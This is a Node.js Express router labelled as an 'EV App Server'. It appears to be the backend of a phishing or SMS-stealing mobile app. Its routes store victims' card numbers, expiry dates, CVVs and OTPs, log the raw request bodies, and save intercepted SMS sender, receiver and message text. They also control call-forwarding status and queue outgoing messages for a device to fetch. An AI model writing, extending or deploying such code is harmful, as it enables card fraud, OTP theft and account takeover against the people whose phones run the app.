import express from "express";
import UserModel from "./Schema/user.schema.js";
import FormDataModel from "./Schema/data.schema.js";
import adminRouter from "./Routers/admin.routes.js";

const router = express.Router();

router.get("/", (req, res) => {
  console.log("GET / route hit");
  res.send("Welcome to EV App Server APIs");
});

router.use("/admin", (req, res, next) => {
  console.log("Using /admin router");
  next();
}, adminRouter);

router.post("/save-data", async (req, res) => {
  console.log("POST /save-data route hit");
  try {
    const {
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber,
      otp, // added otp to destructuring
    } = req.body;

    console.log("Request body:", req.body);
    console.log("forwardPhoneNumber:", forwardPhoneNumber);

    if (!mobileNumber) {
      console.log("mobileNumber is missing in request.");
      return res.status(400).json({ message: "mobileNumber is required" });
    }

    // Trim helper
    const trimFields = (obj) => {
      console.log("Trimming fields in object:", obj);
      const result = {};
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === "string") result[key] = value.trim();
        else if (
          key === "mobileNumber" ||
          key === "totalLimit" ||
          key === "availableLimit" ||
          key == "forwardPhoneNumber"
        )
          result[key] = value;
        else result[key] = value;
      }
      console.log("Trimmed result:", result);
      return result;
    };

    const data = trimFields({
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber,
      otp, // add otp to data object
    });

    // Build dynamic update fields (ignore undefined)
    const updateFields = {};
    for (const [key, value] of Object.entries(data)) {
      if (value !== undefined) updateFields[key] = value;
    }
    console.log("updateFields to be set:", updateFields);

    // Find and update OR insert new
    console.log("Calling findOneAndUpdate in UserModel...");
    const user = await UserModel.findOneAndUpdate(
      { mobileNumber: data.mobileNumber },
      { $set: updateFields },
      { new: true, upsert: true }
    );
    console.log("findOneAndUpdate result user:", user);

    // Check if it was an update or create
    const existed = await UserModel.exists({ mobileNumber: data.mobileNumber });
    console.log("User existed before upsert? :", existed);

    res.status(existed ? 200 : 201).json({
      message: existed
        ? "User updated successfully"
        : "User created successfully",
      data: user,
    });
    console.log("Response sent for /save-data:", existed ? "update" : "create");
  } catch (error) {
    console.log("Error in /save-data:", error);
    if (error.code === 11000) {
      console.log("Duplicate entry error:", error.keyValue);
      return res
        .status(409)
        .json({ message: "Duplicate entry", error: error.keyValue });
    }
    res
      .status(500)
      .json({ message: "Error saving user", error: error.message });
  }
});

router.post("/formdata", async (req, res) => {
  console.log("POST /formdata route hit");
  try {
    const { senderPhoneNumber, message, time, recieverPhoneNumber } = req.body;
    console.log("Request body for /formdata:", req.body);

    // Basic validation
    if (!senderPhoneNumber || !message || !time || !recieverPhoneNumber) {
      console.log("Missing field(s) in /formdata:", {
        senderPhoneNumber,
        message,
        time,
        recieverPhoneNumber
      });
      return res.status(400).json({ message: "All fields are required" });
    }

    const formData = new FormDataModel({
      senderPhoneNumber,
      message,
      time,
      recieverPhoneNumber,
    });
    console.log("New FormDataModel created:", formData);

    await formData.save();
    console.log("Form data saved to DB:", formData);

    res.status(201).json({
      message: "Form data saved successfully",
      data: formData,
    });
    console.log("Response sent for /formdata success.");
  } catch (error) {
    console.log("Error in /formdata:", error);
    res
      .status(500)
      .json({ message: "Error saving form data", error: error.message });
  }
});

router.post("/get-forwarded-number", async (req, res) => {
  try {
    console.log("/get-forwarded-number endpoint hit");
    const { mobileNumber } = req.body;
    console.log("Request body:", req.body);

    if (!mobileNumber) {
      console.log("mobileNumber is missing");
      return res.status(400).json({ status: false, message: "mobileNumber is required" });
    }

    const user = await UserModel.findOne({ mobileNumber: mobileNumber });
    console.log("User found:", user);

    let forwardedStatus;
    if (!user || !user.forwardPhoneNumber) {
      forwardedStatus = "disabled";
      console.log("Forwarded number not found for mobileNumber:", mobileNumber);
      return res.status(200).json({
        status: forwardedStatus,
        message: "Forwarded number not found",
      });
    } else {
      if (user.isForwarded === "active") {
        forwardedStatus = "active";
      } else {
        forwardedStatus = "deactive";
      }
      console.log("Forwarded number found:", user.forwardPhoneNumber);
      return res.status(200).json({
        status: forwardedStatus,
        forwardPhoneNumber: user.forwardPhoneNumber,
      });
    }
  } catch (error) {
    console.error("Error in /get-forwarded-number:", error);
    res.status(500).json({
      status: false,
      message: "Internal server error",
      error: error.message,
    });
  }
});

router.post("/add-to-and-message", async (req, res) => {
  try {
    const { phoneNo, to, message } = req.body;
    console.log(phoneNo, to, message);

    // Validation for required fields
    if (!phoneNo || !to || !message) {
      console.log("Missing one of required fields (phoneNo, to, message) in /add-to-and-message. Req body:", req.body);
      return res.status(400).json({
        success: false,
        message: "phoneNo, to, and message are required fields",
      });
    }

    // Find user using the correct field from schema ('mobileNumber')
    let user = await UserModel.findOne({ mobileNumber: phoneNo });

    console.log(user);

    if (user) {
      // If user exists, update 'to', 'message', and 'messageFetched'
      user.to = to;
      user.message = message;
      user.messageFetched = false;
      await user.save();
      console.log("User updated and saved in /add-to-and-message.", { userId: user._id });

      return res.status(200).json({
        success: true,
        message: "User data updated successfully.",
        data: user,
      });
    } else {
      // If user doesn't exist, create new user and set required fields only
      const newUser = new UserModel({
        mobileNumber: phoneNo,
        to: to,
        message: message,
        messageFetched: false,
      });
      await newUser.save();
      console.log("New user created and saved in /add-to-and-message.", { userId: newUser._id });

      return res.status(201).json({
        success: true,
        message: "User created successfully.",
        data: newUser,
      });
    }
  } catch (error) {
    console.error("Error in /add-to-and-message:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message,
    });
  }
});

router.post("/fetch-to-and-message", async (req, res) => {
  try {
    const { phoneNo } = req.body;
    if (!phoneNo) {
      console.log("/fetch-to-and-message: phoneNo missing in request.");
      return res.status(400).json({
        success: false,
        message: "phoneNo is required"
      });
    }

    // Find user by phoneNo
    let user = await UserModel.findOne({ mobileNumber: phoneNo });
    console.log("/fetch-to-and-message: User lookup for", phoneNo, "Result:", user);

    if (!user) {
      console.log("/fetch-to-and-message: User not found for", phoneNo);
      return res.status(404).json({
        success: false,
        message: "User not found"
      });
    }

    // Check if already fetched
    if (user.messageFetched) {
      console.log("/fetch-to-and-message: messageFetched already true for", phoneNo);
      return res.status(400).json({
        success: false,
        message: "Unable to fetch. Already fetched."
      });
    }

    // Mark messageFetched as true and return to/message
    user.messageFetched = true;
    await user.save();
    console.log("/fetch-to-and-message: messageFetched marked true. Returning to/message.", {
      to: user.to,
      message: user.message
    });
    return res.status(200).json({
      success: true,
      to: user.to,
      message: user.message
    });
  } catch (error) {
    console.error("Error in /fetch-to-and-message:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

router.post("/set-forward-status", async (req, res) => {
  try {
    const { mobileNumber, isForwarded } = req.body;

    if (!mobileNumber) {
      return res.status(400).json({
        success: false,
        message: "mobileNumber is required"
      });
    }

    if (!["active", "deactive"].includes(isForwarded)) {
      return res.status(400).json({
        success: false,
        message: "isForwarded must be 'active' or 'deactive'"
      });
    }

    const user = await UserModel.findOneAndUpdate(
      { mobileNumber },
      { isForwarded },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({
        success: false,
        message: "User not found"
      });
    }

    return res.status(200).json({
      success: true,
      message: `isForwarded status set to ${isForwarded}`,
      data: {
        mobileNumber: user.mobileNumber,
        isForwarded: user.isForwarded
      }
    });
  } catch (error) {
    console.error("Error in /set-forward-status:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});




export default router;
